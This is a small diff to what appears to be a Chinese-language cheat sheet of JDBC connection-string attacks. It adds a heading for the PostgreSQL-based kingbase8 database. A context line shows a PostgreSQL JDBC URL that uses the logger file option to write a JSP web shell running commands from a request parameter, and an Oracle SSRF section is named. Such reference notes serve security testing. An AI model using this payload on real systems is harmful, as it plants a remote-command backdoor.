@@ -339,6 +339,12 @@ driver:`com.ibm.db2.jcc.DB2Driver`
 
 `jdbc:postgresql://<%Runtime.getRuntime().exec(request.getParameter("i"));%>:52791/test?loggerLevel=TRACE&loggerFile=shell.jsp`
 
+## kingbase8
+
+国产化数据库 基于postgre实现
+
+
+
 ## Oracle
 
 泄露user SSRF
